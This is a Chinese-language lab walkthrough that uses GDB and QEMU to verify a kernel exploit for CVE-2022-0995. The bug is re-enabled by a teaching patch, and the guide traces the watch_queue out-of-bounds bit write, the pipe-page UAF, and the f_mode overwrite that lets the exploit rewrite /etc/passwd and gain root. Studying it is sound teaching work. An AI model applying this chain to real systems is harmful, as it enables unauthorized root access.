# PageJack：用 GDB 验证利用链

这份指南对应我在 2026-09-14 对本项目的实际验证。命令中的源码行号和断点编号按 Linux 6.5-rc1 教学补丁记录。

实验只在 QEMU guest 中进行。当前 debug 内核打开了 `CONFIG_PAGEJACK_LAB_VULN=y`，并不是在宿主机内核上测试真实漏洞。

## 一、先理解两个终端

```text
终端 A：QEMU 串口，输入 /exp/exp
终端 B：GDB，控制 QEMU 中暂停的内核
```

`run_gdb.sh` 使用 `-nographic -S -gdb tcp::1234`：

- `-nographic`：QEMU 串口就在当前终端，不会另外弹一个 QEMU 图形窗口；
- `-S`：CPU 启动时暂停，等 GDB 发出 `continue`；
- `-gdb tcp::1234`：GDB 通过本机 1234 端口连接 guest。

本目录的调试脚本显式使用 `page_alloc.shuffle=0`，目的是减少这个教学 demo 的页面布局随机性。它不改变漏洞代码，只影响 guest 启动时的页分配顺序。

如果你从 GitHub Release 获取了预编译内核，GDB 符号文件已经包含，但 Linux 源码树没有放进 Git 仓库。首次调试前，在项目根目录准备与符号匹配的源码和补丁：

```bash
mkdir -p kernel/source
git clone --depth 1 --single-branch --branch v6.5-rc1 \
  https://github.com/torvalds/linux.git kernel/source/linux-6.5-rc1
patch --directory=kernel/source/linux-6.5-rc1 -p1 \
  < kernel/patches/0001-pagejack-lab-vuln.patch
```

这只准备源码供 GDB 显示和设置源码断点，不会重新编译内核。

## 二、启动 QEMU 和 GDB

### 终端 A：启动 QEMU

```bash
cd /path/to/Page_Jack_pwn
./run_gdb.sh
```

预期：终端 A 一开始没有 shell，因为 CPU 还在 `-S` 状态。

### 终端 B：启动 GDB

```bash
cd /path/to/Page_Jack_pwn
gdb -q ./kernel/vmlinux -x ./gdb-pagejack.gdb
```

预期看到：

```text
Reading symbols from ./kernel/vmlinux...
Breakpoint 1 at ... watch_queue.c:309
Breakpoint 2 at ... fs/pipe.c:785
Breakpoint 3 at ... fs/pipe.c:718
PageJack GDB target connected.  Use 'continue' to boot or resume.
(gdb)
```

这一步验证了 `vmlinux` 和源码路径能够匹配。三个断点分别是 `watch_queue_set_filter()`、`alloc_pipe_info()` 和 `pipe_release()`。

## 三、处理启动时的普通断点

在 GDB 输入：

```gdb
continue
```

预期可能先停在：

```text
Breakpoint 2, alloc_pipe_info ()
    at .../fs/pipe.c:785
```

这不是漏洞触发点，只是系统启动过程中创建普通 pipe。关闭两个无关断点：

```gdb
disable 2 3
continue
```

随后终端 A 应该出现：

```text
Boot took ... seconds
/bin/sh: can't access tty; job control turned off
~ $
```

`job control turned off` 只是 `-nographic` 没有控制终端，不代表失败。

## 四、确认 ioctl 进入漏洞函数

回到终端 A，输入：

```text
/exp/exp
```

预期先看到：

```text
[*] CVE-2022-0995 by Lotus
[*] spray pipe_buffer...
[+] edit the pipe_buffer size to 0x60
[*] allocating pipe pages...
[*] Create 2 holes in pipe_buffer...
[+] Trigger OOB
```

此时 GDB 会命中断点 1：

```text
Breakpoint 1, watch_queue_set_filter (...)
    at .../kernel/watch_queue.c:309
```

输入：

```gdb
bt 8
list 304,314
```

预期调用栈的核心部分是：

```text
#0  watch_queue_set_filter (...)
#1  vfs_ioctl (...)
#2  __do_sys_ioctl (...)
#3  __se_sys_ioctl (...)
#4  __x64_sys_ioctl (...)
```

这说明 exploit 是通过用户态 `ioctl()` 进入 `vfs_ioctl()`，再进入 `watch_queue_set_filter()`。

## 五、停在 tf[i].type 的复制位置

关闭入口断点，在第 367 行设置条件断点，直接等待最后一条规则：

```gdb
disable 1
break kernel/source/linux-6.5-rc1/kernel/watch_queue.c:367 if i == 3
continue
```

停下后应直接满足 `i == 3`，再输入：

```gdb
p i
p/x tf[i].type
p/x filter.nr_filters
p/x wfilter
p/x (char *)wfilter->type_filter + 0x60
p/x sizeof(unsigned long)
p/x sizeof(struct watch_filter)
p/x sizeof(struct watch_type_filter)
```

我本次实际看到：

```text
$1 = 3
$2 = 0x306
$3 = 0x4
$4 = 0xffff888007161960
$5 = 0xffff8880071619c0
$6 = 0x8
$7 = 0x18
$8 = 0x10
```

地址每次运行可能不同，但以下结果应该保持一致：

```text
i == 3
tf[i].type == 0x306
filter.nr_filters == 4
sizeof(unsigned long) == 8
```

## 六、单步观察 __set_bit

在第 367 行停下时查看源码：

```gdb
list 367,372
```

预期能看到：

```c
q->type = tf[i].type;
q->info_filter = tf[i].info_filter;
q->info_mask = tf[i].info_mask;
q->subtype_filter[0] = tf[i].subtype_filter[0];
__set_bit(q->type, wfilter->type_filter);
q++;
```

使用 `next` 走到第 371 行：

```gdb
next
next
next
next
x/4gx (char *)wfilter->type_filter + 0x50
```

然后单步执行第 371 行，再查看一次：

```gdb
next
x/4gx (char *)wfilter->type_filter + 0x50
```

理论计算是：

```text
0x306 / 64 = 0xc
0x306 % 64 = 0x6
0xc * 8    = 0x60
1 << 6     = 0x40
```

本次同一轮实验中，目标字节确实发生了变化：

```text
before: 0xffffea00001ec780
after:  0xffffea00001ec7c0
```

两者相差 `0x40`。如果另一次运行的目标字节原来已经包含 `0x40`，前后也可能完全一样；因为 `__set_bit()` 本质上是按位 OR，这种情况仍然表示指令执行了。

完成观察后关闭条件断点 4：

```gdb
disable 4
continue
```

## 七、验证页面重合、页面 UAF 和 f_mode

终端 A 接下来可能输出：

```text
[*] finding...
found pipe coincide at idx:37 and 36
[*] uaf one of the pipe_buffer->page
[*] Spray pwd file struct...
[*] Edit pwd file->f_mode...
Setting root password to "Lotus"...
[*] finally: edit the pwd file
Write Success:106!
```

我本次实际运行得到的页面对是 `23 and 22`，写入成功编号是 `101`。两个数字不是固定值，换一轮可能不同。

最后看到新的 root 密码行，说明 exploit 已经把 `/etc/passwd` 对应 `struct file` 的 `f_mode` 改成可写。

## 八、最终权限验证

不要依赖交互式 `su root`，因为 QEMU 使用 `-nographic`。在终端 A 输入：

```sh
echo Lotus | su root -c 'id; strings /flag | head -n 1'
```

预期：

```text
Password:
uid=0(root) gid=0(root) groups=0(root)
flag{PageJack_Demo_Flag_ZJU_RKP}
```

我本次实际得到的就是上面三行。到这里，才算完成 GDB 观察入口、QEMU 完成利用和 root 读取 flag 的整条验证链。

## 九、如果出现 Not hit

如果终端 A 输出：

```text
[*] finding...
[*]Not hit.
```

这表示本轮 pipe 页面布局没有形成可用重合，不表示 `0x306` 没有进入 `__set_bit()`。在加入显式 `page_alloc.shuffle=0` 之前，我实际有三轮在完成 GDB 关键检查后得到 `Not hit`；加入参数并使用条件断点后，同一轮完成了后续利用：

```text
found pipe coincide at idx:37 and 36
Write Success:106!
```

处理方法是回到 QEMU 终端按 `Ctrl-C`，重新执行：

```bash
./run_gdb.sh
```

然后从第二节重新连接 GDB。不要因为一次 `Not hit` 就修改 `0x306`。

## 十、验证完成标准

下面几项全部出现，才把实验记为成功：

```text
[GDB] watch_queue_set_filter() 命中
[GDB] bt 中出现 vfs_ioctl -> __do_sys_ioctl
[GDB] i == 3
[GDB] tf[i].type == 0x306
[QEMU] found pipe coincide at idx:... and ...
[QEMU] uaf one of the pipe_buffer->page
[QEMU] Write Success:...!
[QEMU] uid=0(root) gid=0(root) groups=0(root)
[QEMU] flag{PageJack_Demo_Flag_ZJU_RKP}
```

我本次完整成功结果是：

```text
watch_queue_set_filter()：已命中
i=3, tf[i].type=0x306：已验证
found pipe coincide at idx:37 and 36
Write Success:106!
uid=0(root) gid=0(root) groups=0(root)
flag{PageJack_Demo_Flag_ZJU_RKP}
```

源码入口：`challenge/exp.c:173-198`、`challenge/exp.c:250-252`、`challenge/exp.c:256-349`、`challenge/exp.c:362-410`，以及 `kernel/source/linux-6.5-rc1/kernel/watch_queue.c:307-373`。
